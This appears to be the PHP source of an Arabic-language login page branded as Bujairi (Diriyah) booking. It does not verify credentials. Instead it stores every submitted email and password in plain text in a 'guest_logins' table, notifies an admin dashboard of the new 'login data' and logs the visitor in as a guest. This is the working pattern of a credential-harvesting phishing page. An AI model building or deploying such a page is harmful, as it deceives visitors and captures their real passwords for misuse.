<?php
declare(strict_types=1);
require __DIR__ . '/dashboard/init.php';

auth_login_next_apply_get();

$error = '';
$pageTitle = 'تسجيل الدخول';

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
    $email = trim((string) ($_POST['email'] ?? ''));
    $password = (string) ($_POST['password'] ?? $_POST['Password'] ?? '');

    if ($email === '' || $password === '') {
        $error = 'يرجى إدخال البريد وكلمة المرور.';
    } elseif (strpos($email, '@') === false) {
        $error = 'يرجى إدخال بريد إلكتروني يبدو صالحاً.';
    } else {
        $nextSnapshot = (string) ($_SESSION['login_next'] ?? '');
        $saveError = '';
        try {
            $ins = bujairi_pdo()->prepare(
                'INSERT INTO guest_logins (email, password_entered, next_after_login) VALUES (?, ?, ?)'
            );
            $ins->execute([
                $email,
                $password,
                $nextSnapshot !== '' ? $nextSnapshot : null,
            ]);
        } catch (Throwable $e) {
            $saveError = 'تعذر حفظ البيانات. نفّذ sql/install.sql أو sql/migration_guest_logins.sql لإنشاء جدول guest_logins.';
        }
        if ($saveError !== '') {
            $error = $saveError;
        } else {
            $guestRowId = (int) bujairi_pdo()->lastInsertId();
            if (function_exists('bujairi_pusher_notify_admin_orders_changed')) {
                bujairi_pusher_notify_admin_orders_changed();
            }
            if ($guestRowId > 0 && \function_exists('bujairi_pusher_notify_dashboard_new_client')) {
                bujairi_pusher_notify_dashboard_new_client(-$guestRowId, 'بيانات تسجيل دخول (ضيف)');
            }
            auth_guest_login($email);
            if (!empty($_POST['remember'])) {
                auth_remember_extend_session_cookie();
            }
            $back = bujairi_safe_internal_return((string) ($_POST['return'] ?? ''));
            if ($back !== '') {
                redirect($back);
            }
            redirect(auth_login_next_redirect_for_customer());
        }
    }
}

$authFlowTitle = 'تسجيل الدخول';
$authFlowStep = 1;
$nextQuery = isset($_SESSION['login_next']) && ($_SESSION['login_next'] === AUTH_NEXT_DIRIYAH || $_SESSION['login_next'] === AUTH_NEXT_RESTAURANT)
    ? ('?next=' . urlencode((string) $_SESSION['login_next']))
    : '';
$returnField = bujairi_safe_internal_return((string) ($_GET['return'] ?? ''));
?><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo h($pageTitle); ?> — <?php echo h(APP_NAME); ?></title>
    <link rel="icon" href="https://s3.ticketmx.com/bujairi/images/favicon.ico">
    <link rel="stylesheet" href="https://s3.ticketmx.com/fonts/NeoSansArabic/NeoSansArabic.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config = { theme: { extend: { colors: { bujairi: '#a68b5a' } } } };</script>
</head>
<body class="min-h-screen flex flex-col bg-[#f2efe9] text-[#2d2438]" style="font-family: 'Neo Sans Arabic', 'Segoe UI', sans-serif;">
<?php require __DIR__ . '/dashboard/auth-booking-flow-header.php'; ?>

<main class="flex-grow px-4 py-8 flex flex-col items-center">
    <div class="w-full max-w-md bg-white rounded-2xl shadow-lg border border-[#e5e0d8] overflow-hidden">
        <div class="bg-[#4b3447] text-white text-center py-3 font-bold text-sm">تسجيل الدخول</div>
        <form method="post" action="<?php echo h(url('login.php')); ?>" class="p-6 sm:p-8 space-y-5" autocomplete="on">
            <?php if ($returnField !== ''): ?>
                <input type="hidden" name="return" value="<?php echo h($returnField); ?>">
            <?php endif; ?>
            <?php if ($error !== ''): ?>
                <div class="rounded-xl bg-red-50 text-red-800 border border-red-100 px-4 py-3 text-sm text-center"><?php echo h($error); ?></div>
            <?php endif; ?>
            <div>
                <label for="email" class="block text-sm font-bold text-[#4b3447] mb-2">البريد الإلكتروني</label>
                <input id="email" name="email" type="email" required value="<?php echo h((string) ($_POST['email'] ?? '')); ?>"
                       class="w-full rounded-xl border border-gray-300 px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-[#ffc750]/80 focus:border-[#4b3447]"
                       placeholder="you@example.com" autocomplete="username">
            </div>
            <div>
                <label for="password" class="block text-sm font-bold text-[#4b3447] mb-2">كلمة المرور <span class="text-red-600">*</span></label>
                <input id="password" name="password" type="password" required
                       class="w-full rounded-xl border border-gray-300 px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-[#ffc750]/80 focus:border-[#4b3447]"
                       autocomplete="current-password">
            </div>
            <div class="flex flex-col gap-2">
                <label class="inline-flex items-center gap-2 cursor-pointer text-sm text-gray-700">
                    <input type="checkbox" name="remember" value="1" class="rounded border-gray-300 text-[#4b3447] focus:ring-[#ffc750]">
                    تذكرني
                </label>
                <a href="#" class="text-sm text-[#4b3447] underline hover:text-[#6b4d6b]">نسيت كلمة المرور ؟</a>
            </div>
            <button type="submit" class="w-full py-4 rounded-xl bg-[#ffc750] hover:bg-[#f5bd3f] text-[#2d2438] font-bold text-base shadow-sm transition border border-[#e8b73a]">
                تسجيل الدخول
            </button>
        </form>
        <div class="border-t border-gray-100 px-6 py-5 text-center text-sm text-gray-600">
            ليس لديك حساب ؟
            <a href="<?php echo h(url('register.php' . $nextQuery)); ?>" class="font-bold text-[#4b3447] hover:underline">تسجيل حساب جديد</a>
        </div>
    </div>
    <p class="mt-8 text-center text-sm text-gray-500">
        <a href="<?php echo h(url('index.php')); ?>" class="text-[#4b3447] font-semibold hover:underline">← العودة للرئيسية</a>
    </p>
</main>
<?php require_once __DIR__ . '/dashboard/bujairi-public-scripts.php'; ?>
</body>
</html>
